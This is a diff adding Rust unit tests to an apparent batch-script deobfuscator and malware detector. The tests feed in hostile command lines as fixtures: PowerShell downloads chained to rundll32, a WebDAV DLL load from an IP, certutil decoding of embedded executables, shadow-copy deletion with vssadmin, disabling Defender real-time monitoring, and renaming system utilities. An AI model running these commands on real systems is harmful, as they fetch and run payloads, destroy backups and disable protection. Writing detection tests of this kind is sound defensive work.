+                    Trait::Rundll32 { url: Some(url), .. }
+                        if url == "https://rundll32-basename.example/stage.dll"
+                )
+            }),
+            "rundll32 basename DLL did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn rundll32_resolves_late_powershell_download_destination() {
+        let report = crate::analyze(
+            br#"powershell invoke-webrequest -uri http://rundll32-late.example/images/62.gif -outfile c:\programdata\COIm.jpg
+rundll32 c:\programdata\COIm.jpg,init"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Rundll32 { cmd, url: Some(url) }
+                        if cmd == r#"rundll32 c:\programdata\COIm.jpg,init"#
+                            && url == "http://rundll32-late.example/images/62.gif"
+                )
+            }),
+            "rundll32 did not resolve late PowerShell download destination: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn rundll32_webdav_dll_argument_resolves_http_url() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"rundll32 \\45.9.74.32@8888\davwwwroot\596.dll,entry"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Rundll32 { url: Some(url), .. }
+                        if url == "http://45.9.74.32:8888/596.dll"
+                )
+            }),
+            "rundll32 WebDAV DLL source URL was not resolved: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -6210,6 +11095,44 @@ mod misc_handler_tests {
             .traits
             .iter()
             .any(|t| matches!(t, Trait::WindowsUtilManip { .. })));
+    }
+
+    #[test]
+    fn move_system32_utility_emits_manipulation_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"move /y C:\Windows\System32\cmd.exe C:\Users\Public\alpha.pif"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::WindowsUtilManip { src, dst, .. }
+                    if src == r#"C:\Windows\System32\cmd.exe"#
+                        && dst == r#"C:\Users\Public\alpha.pif"#
+            )),
+            "move did not surface Windows utility manipulation: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn ren_system32_security_utility_emits_manipulation_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"rename C:\Windows\System32\SecurityHealthService.exe Celka.sej"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::WindowsUtilManip { src, dst, .. }
+                    if src == r#"C:\Windows\System32\SecurityHealthService.exe"#
+                        && dst == "Celka.sej"
+            )),
+            "rename did not surface Windows utility manipulation: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -6247,6 +11170,194 @@ mod for_f_tests {
     }
 
     #[test]
+    fn for_f_substitutes_tilde_name_modifier() {
+        let script =
+            br#"for /F "delims=" %%A in ("driver.inf") do if "%%~nA" NEQ "%%~A" echo stem=%%~nA full=%%~A"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report
+                .deobfuscated
+                .contains("echo stem=driver full=driver.inf"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. })),
+            "modifier-backed IF should resolve: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_substitutes_common_tilde_path_modifiers() {
+        let script = br#"for /F "delims=" %%A in ("C:\Temp\driver.inf") do echo d=%%~dA p=%%~pA dp=%%~dpA n=%%~nA x=%%~xA nx=%%~nxA short=%%~sA full=%%~A"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains(
+                r#"echo d=C: p=\Temp\ dp=C:\Temp\ n=driver x=.inf nx=driver.inf short=C:\Temp\driver.inf full=C:\Temp\driver.inf"#
+            ),
+            "got:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_file_source_expands_variable_to_tracked_file() {
+        use crate::traits::Trait;
+        let script = br#"echo alpha=one>config.ini
+set "CFG=config.ini"
+for /F "tokens=1,2 delims==" %%A in (%CFG%) do echo key=%%A value=%%B
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo key=alpha value=one"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline } if pipeline == "%CFG%"
+            )),
+            "variable-backed file source should resolve: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_curl_public_ip_endpoint_feeds_later_variable() {
+        use crate::traits::Trait;
+        let script = br#"setlocal EnableDelayedExpansion
+for /F "tokens=* delims=" %%I in ('curl -s https://api.ipify.org') do set "publicIP=%%I"
+echo archive=W_%USERNAME%_!publicIP!.zip
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report
+                .deobfuscated
+                .contains("echo archive=W_puncher_203.0.113.10.zip"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline } if pipeline.contains("api.ipify.org")
+            )),
+            "public-IP curl endpoint should synthesize a stable response: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_reads_ip_api_csv_downloaded_by_powershell() {
+        use crate::traits::Trait;
+        let script = br#"powershell -Command "(New-Object Net.WebClient).DownloadFile('http://ip-api.com/csv', 'GEO.csv')"
+for /f "tokens=6 delims=, " %%A in (GEO.csv) do echo city=%%A>location.txt
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report
+                .deobfuscated
+                .contains("echo city=Metropolis>location.txt"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline } if pipeline == "GEO.csv"
+            )),
+            "downloaded ip-api CSV file source should resolve: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_noisy_non_ascii_type_command_reads_tracked_file() {
+        use crate::traits::Trait;
+        let script = "echo alpha>tmp\r\nfor /F \"tokens=*\" %%A in ('t%(◕‿◕)%%(⊙ω⊙)%pe tmp') do echo got=%%A\r\n";
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo got=alpha"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline } if pipeline.contains("tmp")
+            )),
+            "noisy supported type command should resolve: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_noisy_type_command_missing_middle_letters_reads_tracked_file() {
+        use crate::traits::Trait;
+        let script = "echo alpha>tmp\r\nfor /F \"tokens=*\" %%A in ('t%(◕‿◕)(⊙ω⊙)%e tmp') do echo got=%%A\r\n";
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo got=alpha"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline } if pipeline.contains("tmp")
+            )),
+            "noisy supported type command should resolve: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_usebackq_double_quoted_source_reads_tracked_file() {
+        let script = br#"echo alpha=one>config.ini
+for /F "usebackq tokens=1,2 delims==" %%A in ("config.ini") do echo key=%%A value=%%B
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo key=alpha value=one"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::ForUnresolvedSource { .. })),
+            "usebackq file source should resolve: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_usebackq_dynamic_double_quoted_source_preserves_fallback() {
+        let script =
+            br#"for /F "usebackq tokens=1,* delims==" %%A in ("%%~i") do echo key=%%A value=%%B"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo key=%%~i value=%%B"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::ForUnresolvedSource { .. })),
+            "dynamic usebackq source should preserve fallback without adding unresolved trait: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn for_f_huge_tokens_range_is_capped_not_oom() {
         // Regression: parse_token_range used to extend Vec<usize> by start..=end
         // with no upper bound; `tokens=1-2147483647` allocated ~17 GB and OOM-
@@ -6267,7 +11378,7 @@ mod for_f_tests {
 
 #[cfg(test)]
 mod synth_tests {
-    use crate::env::{Config, Environment};
+    use crate::env::{Config, Environment, FsEntry};
     use crate::synth::run_pipeline;
 
     #[test]
@@ -6280,6 +11391,25 @@ mod synth_tests {
             joined.to_ascii_lowercase().contains("myvar=abc"),
             "got: {}",
             joined
+        );
+    }
+
+    #[test]
+    fn synth_can_run_pipeline_accepts_ping_handler() {
+        assert!(crate::synth::can_run_pipeline("ping -n 1 example.com"));
+    }
+
+    #[test]
+    fn synth_cmd_prompt_escape_probe_returns_escape_byte() {
+        let mut env = Environment::new(&Config::default());
+        let lines = run_pipeline("echo prompt $E | cmd", &mut env);
+        assert_eq!(lines, vec!["[ESC]"]);
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::ForUnresolvedSource { .. })),
+            "escape probe should not emit unresolved pipeline traits: {:?}",
+            env.traits
         );
     }
 
@@ -6380,6 +11510,50 @@ mod synth_tests {
                 .iter()
                 .any(|t| matches!(t, Trait::ForUnresolvedSource { .. })),
             "expected ForUnresolvedSource trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn synth_command_key_recovers_ascii_skeleton_from_percent_noise() {
+        use crate::traits::Trait;
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "tmp".to_string(),
+            FsEntry::Content {
+                content: b"token one two\r\n".to_vec(),
+                append: false,
+            },
+        );
+        let lines = run_pipeline("ty%ヾ(⌐■_■)ノ%%(◕‿◕)%pe tmp", &mut env);
+        assert_eq!(lines, vec!["token one two"]);
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::ForUnresolvedSource { .. })),
+            "noisy supported command should not be unresolved: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn synth_command_key_expands_adjacent_undefined_percent_noise() {
+        use crate::traits::Trait;
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "tmp".to_string(),
+            FsEntry::Content {
+                content: b"token one two\r\n".to_vec(),
+                append: false,
+            },
+        );
+        let lines = run_pipeline("ty%ASCII NOISE%%MORE NOISE%pe tmp", &mut env);
+        assert_eq!(lines, vec!["token one two"]);
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::ForUnresolvedSource { .. })),
+            "adjacent undefined percent-noise command should not be unresolved: {:?}",
             env.traits
         );
     }
@@ -6488,8 +11662,10 @@ mod char_boundary_tests {
         input.extend_from_slice(
             b" random for /f %%i in (garbage) do echo %%i https://binary.example/payload",
         );
+        input.extend_from_slice(b" Set-MpPreference -DisableRealtimeMonitoring $true");
 
         let report = analyze(&input, &Config::default());
+        assert_eq!(report.recovered_pe.len(), 1);
         assert!(
             !report
                 .traits
@@ -6502,6 +11678,78 @@ mod char_boundary_tests {
             !report.deobfuscated.contains("for /f"),
             "PE binary content leaked into deob output:\n{}",
             report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DownloadInDeobText { src, line_hint }
+                    if src == "https://binary.example/payload" && line_hint == "binary-input"
+            )),
+            "PE binary URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, .. }
+                    if action == "setmp-disablerealtimemonitoring"
+            )),
+            "PE binary behavior strings were not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn binary_input_public_ip_url_emits_network_probe() {
+        let mut input = vec![0u8; 9000];
+        input.extend_from_slice(b"embedded http://ip-api.com/line?fields=proxy string");
+        let mut env = crate::env::Environment::new(&crate::env::Config::default());
+
+        crate::scan_binary_input_urls(&input, &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::DownloadInDeobText { src, line_hint }
+                    if src == "http://ip-api.com/line?fields=proxy" && line_hint == "binary-input"
+            )),
+            "PE binary URL was not extracted: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::NetworkProbe { probe_kind, target }
+                    if probe_kind == "ip-discovery" && target == "ip-api.com"
+            )),
+            "binary public-IP URL was not typed as NetworkProbe: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn binary_input_public_ip_host_match_does_not_use_url_path() {
+        let mut input = vec![0u8; 9000];
+        input.extend_from_slice(b"embedded http://example.com/path/ip-api.com/line string");
+        let mut env = crate::env::Environment::new(&crate::env::Config::default());
+
+        crate::scan_binary_input_urls(&input, &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::DownloadInDeobText { src, line_hint }
+                    if src == "http://example.com/path/ip-api.com/line" && line_hint == "binary-input"
+            )),
+            "PE binary URL was not extracted: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::NetworkProbe { .. })),
+            "URL path substring was incorrectly typed as NetworkProbe: {:?}",
+            env.traits
         );
     }
 
@@ -6544,6 +11792,7 @@ mod cjk_padding_tests {
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod certutil_tests {
+    use crate::analyze;
     use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
     use crate::traits::Trait;
@@ -6583,6 +11832,39 @@ mod certutil_tests {
     }
 
     #[test]
+    fn certutil_decode_basename_source_resolves_full_path_content() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "basename source";
+        env.modified_filesystem.insert(
+            r#"c:\temp\src.b64"#.to_string(),
+            FsEntry::Content {
+                content: b64(payload).into_bytes(),
+                append: false,
+            },
+        );
+
+        interpret_line("certutil -decode src.b64 dst.bin", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "src.b64" && dst == "dst.bin" && *src_resolved
+            )),
+            "certutil basename source was not marked resolved: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("dst.bin"),
+                Some(FsEntry::Decoded { content, .. }) if content == payload.as_bytes()
+            ),
+            "dst.bin was not decoded from full-path source content: {:?}",
+            env.modified_filesystem.get("dst.bin")
+        );
+    }
+
+    #[test]
     fn certutil_decode_pe_adds_recovered_blob() {
         let mut env = Environment::new(&Config::default());
         let mut pe = vec![0u8; 0x84];
@@ -6611,6 +11893,491 @@ mod certutil_tests {
     }
 
     #[test]
+    fn certutil_decode_skips_optional_force_flag() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "src.b64".to_string(),
+            FsEntry::Content {
+                content: b64("hello").into_bytes(),
+                append: false,
+            },
+        );
+
+        interpret_line("certutil -decode -f src.b64 dst.bin", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "src.b64" && dst == "dst.bin" && *src_resolved
+            )),
+            "certutil -decode -f paths were not parsed: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("dst.bin"),
+                Some(FsEntry::Decoded { content, .. }) if content == b"hello"
+            ),
+            "dst.bin was not decoded: {:?}",
+            env.modified_filesystem.get("dst.bin")
+        );
+    }
+
+    #[test]
+    fn certutil_decode_skips_slash_force_flag() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "src.b64".to_string(),
+            FsEntry::Content {
+                content: b64("hello").into_bytes(),
+                append: false,
+            },
+        );
+
+        interpret_line("certutil -decode /f src.b64 dst.bin", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "src.b64" && dst == "dst.bin" && *src_resolved
+            )),
+            "certutil -decode /f paths were not parsed: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("dst.bin"),
+                Some(FsEntry::Decoded { content, .. }) if content == b"hello"
+            ),
+            "dst.bin was not decoded: {:?}",
+            env.modified_filesystem.get("dst.bin")
+        );
+    }
+
+    #[test]
+    fn certutil_slash_decode_writes_fs_entry() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "src.b64".to_string(),
+            FsEntry::Content {
+                content: b64("slash decode").into_bytes(),
+                append: false,
+            },
+        );
+
+        interpret_line("certutil /decode /f src.b64 dst.bin", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "src.b64" && dst == "dst.bin" && *src_resolved
+            )),
+            "certutil /decode paths were not parsed: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("dst.bin"),
+                Some(FsEntry::Decoded { content, .. }) if content == b"slash decode"
+            ),
+            "dst.bin was not decoded from /decode: {:?}",
+            env.modified_filesystem.get("dst.bin")
+        );
+    }
+
+    #[test]
+    fn certutil_decodehex_accepts_offset_dump_rows() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "src.hex".to_string(),
+            FsEntry::Content {
+                content: b"0000  68 65 6c 6c 6f  |hello|\r\n0005  20 77 6f 72 6c 64  | world|\r\n"
+                    .to_vec(),
+                append: false,
+            },
+        );
+
+        interpret_line("certutil -decodehex src.hex dst.bin", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "src.hex" && dst == "dst.bin" && *src_resolved
+            )),
+            "certutil -decodehex trait missing: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("dst.bin"),
+                Some(FsEntry::Decoded { content, .. }) if content == b"hello world"
+            ),
+            "dst.bin was not decoded from offset hex dump: {:?}",
+            env.modified_filesystem.get("dst.bin")
+        );
+    }
+
+    #[test]
+    fn certutil_slash_decodehex_accepts_offset_dump_rows() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "src.hex".to_string(),
+            FsEntry::Content {
+                content: b"0000  73 6c 61 73 68  |slash|\r\n0005  20 68 65 78  | hex|\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        interpret_line("certutil /decodehex src.hex dst.bin", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "src.hex" && dst == "dst.bin" && *src_resolved
+            )),
+            "certutil /decodehex trait missing: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("dst.bin"),
+                Some(FsEntry::Decoded { content, .. }) if content == b"slash hex"
+            ),
+            "dst.bin was not decoded from /decodehex offset dump: {:?}",
+            env.modified_filesystem.get("dst.bin")
+        );
+    }
+
+    #[test]
+    fn certutil_decode_self_basename_resolves_with_input_path() {
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let script = format!(
+            "certutil -decode -f %~nx0 payload.exe\r\n-----BEGIN CERTIFICATE-----\r\n{b64}\r\n-----END CERTIFICATE-----\r\n"
+        );
+
+        let report = crate::analyze_with_path(
+            script.as_bytes(),
+            &Config::default(),
+            std::path::Path::new(r"C:\Users\al\Downloads\invoice.cmd"),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "invoice.cmd" && dst == "payload.exe" && *src_resolved
+            )),
+            "self basename certutil source was not resolved: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label == "certutil-decode:payload.exe" && blob == &pe),
+            "self-decoded PE was not exported: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn certutil_decode_self_new_certificate_request_recovers_pe() {
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let script = format!(
+            "certutil -decode \"%~f0\" payload.exe\r\n-----BEGIN NEW CERTIFICATE REQUEST-----\r\n{b64}\r\n-----END NEW CERTIFICATE REQUEST-----\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CertutilDecode { src, dst, src_resolved }
+                    if src == "%~f0" && dst == "payload.exe" && *src_resolved
+            )),
+            "self certutil decode trait missing/resolution false: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label == "certutil-decode:payload.exe" && blob == &pe),
+            "NEW CERTIFICATE REQUEST PE was not recovered: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn long_pe_base64_carrier_line_is_summarized() {
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        pe.resize(12_288, 0);
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let script = format!(
+            "findstr /V marker \"%0\" > payload.b64\r\n{b64}\r\ncertutil -decode payload.b64 payload.dll\r\nrundll32 payload.dll,x\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("harrington: omitted base64 PE carrier"),
+            "PE carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64[..256]),
+            "raw PE base64 carrier leaked into deob output"
+        );
+    }
+
+    #[test]
+    fn unreachable_raw_pem_pe_carrier_is_exported() {
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        pe.resize(12_289, 0);
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let wrapped = b64
+            .as_bytes()
+            .chunks(64)
+            .map(|chunk| std::str::from_utf8(chunk).expect("ascii"))
+            .collect::<Vec<_>>()
+            .join("\r\n");
+        let script = format!(
+            "goto :eof\r\n-----BEGIN CERTIFICATE-----\r\n{wrapped}\r\n-----END CERTIFICATE-----\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label.contains("embedded-base64-pe") && blob == &pe),
+            "unreachable raw PEM PE carrier was not exported: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn embedded_base64_pe_carrier_hint_recognizes_supported_prefixes() {
+        let mut direct_pe = vec![0u8; 0x84];
+        direct_pe[0..2].copy_from_slice(b"MZ");
+        direct_pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        direct_pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        direct_pe.resize(4096, 0);
+        let direct_b64 = base64::engine::general_purpose::STANDARD.encode(&direct_pe);
+        let hex_lower_b64 =
+            base64::engine::general_purpose::STANDARD.encode(hex::encode(&direct_pe));
+        let hex_upper_b64 =
+            base64::engine::general_purpose::STANDARD.encode(hex::encode_upper(&direct_pe));
+
+        assert!(crate::has_embedded_base64_pe_carrier_hint(
+            format!("goto :eof\r\n{direct_b64}\r\n").as_bytes()
+        ));
+        assert!(crate::has_embedded_base64_pe_carrier_hint(
+            format!("goto :eof\r\n {hex_lower_b64}\r\n").as_bytes()
+        ));
+        assert!(crate::has_embedded_base64_pe_carrier_hint(
+            format!("goto :eof\r\n\t{hex_upper_b64}\r\n").as_bytes()
+        ));
+        assert!(!crate::has_embedded_base64_pe_carrier_hint(
+            b"echo ordinary script text with incidental TV bytes\r\n"
+        ));
+        assert!(!crate::has_embedded_base64_pe_carrier_hint(
+            b"echo TVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
+        ));
+        assert!(!crate::has_embedded_base64_pe_carrier_hint(
+            b"echo ordinary script text\r\n"
+        ));
+    }
+
+    #[test]
+    fn unreachable_base64_hex_pe_carrier_is_exported() {
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        pe.resize(4096, 0);
+        let hex = hex::encode(&pe);
+        let b64 = base64::engine::general_purpose::STANDARD.encode(hex);
+        let wrapped = b64
+            .as_bytes()
+            .chunks(64)
+            .map(|chunk| std::str::from_utf8(chunk).expect("ascii"))
+            .collect::<Vec<_>>()
+            .join("\r\n");
+        let script = format!("goto :eof\r\n{wrapped}\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .recovered_pe
+                .iter()
+                .any(|(label, blob)| label.contains("embedded-base64-hex-pe") && blob == &pe),
+            "unreachable base64-hex PE carrier was not exported: {:?}",
+            report
+                .recovered_pe
+                .iter()
+                .map(|(label, blob)| (label.as_str(), blob.len()))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn certutil_decoded_pe_command_strings_are_scanned_for_behavior() {
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        pe.extend_from_slice(b"vssadmin delete shadows /all /quiet");
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let script =
+            format!("echo {b64}>payload.b64\r\ncertutil -decode payload.b64 payload.dll\r\n");
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::AntiRecovery { action } if action == "vssadmin-delete-shadows"
+                )
+            }),
+            "decoded PE behavior string was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn recovered_artifact_behavior_strings_ignore_junk_before_cap() {
+        let mut blob = Vec::new();
+        for idx in 0..600 {
+            blob.extend_from_slice(format!("junk-string-{idx:04}\0").as_bytes());
+        }
+        blob.extend_from_slice(b"vssadmin delete shadows /all /quiet\0");
+
+        let text = crate::recovered_artifact_behavior_text(&blob);
+
+        assert!(
+            text.contains("vssadmin delete shadows"),
+            "late behavior string was dropped after junk strings: {text:?}"
+        );
+    }
+
+    #[test]
+    fn recovered_artifact_behavior_strings_cap_unique_hints() {
+        let mut blob = Vec::new();
+        for _ in 0..600 {
+            blob.extend_from_slice(b"vssadmin delete shadows /all /quiet\0");
+        }
+        for unit in "Set-MpPreference -DisableRealtimeMonitoring $true".encode_utf16() {
+            blob.extend_from_slice(&unit.to_le_bytes());
+        }
+
+        let text = crate::recovered_artifact_behavior_text(&blob);
+
+        assert!(
+            text.contains("vssadmin delete shadows"),
+            "duplicate ASCII behavior string was not retained: {text:?}"
+        );
+        assert!(
+            text.contains("Set-MpPreference -DisableRealtimeMonitoring"),
+            "later distinct UTF-16LE behavior string was dropped after duplicate ASCII hints: {text:?}"
+        );
+    }
+
+    #[test]
+    fn certutil_decoded_pe_utf16_command_strings_are_scanned_for_behavior() {
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        for unit in "Set-MpPreference -DisableRealtimeMonitoring $true".encode_utf16() {
+            pe.extend_from_slice(&unit.to_le_bytes());
+        }
+        let b64 = base64::engine::general_purpose::STANDARD.encode(&pe);
+        let script =
+            format!("echo {b64}>payload.b64\r\ncertutil -decode payload.b64 payload.dll\r\n");
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DefenderEvasion { action, .. }
+                        if action == "setmp-disablerealtimemonitoring"
+                )
+            }),
+            "decoded PE UTF-16 behavior string was not scanned: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn recovered_artifact_amsi_dll_and_eventprovider_strings_are_scanned() {
+        let mut pe = vec![0u8; 0x84];
+        pe[0..2].copy_from_slice(b"MZ");
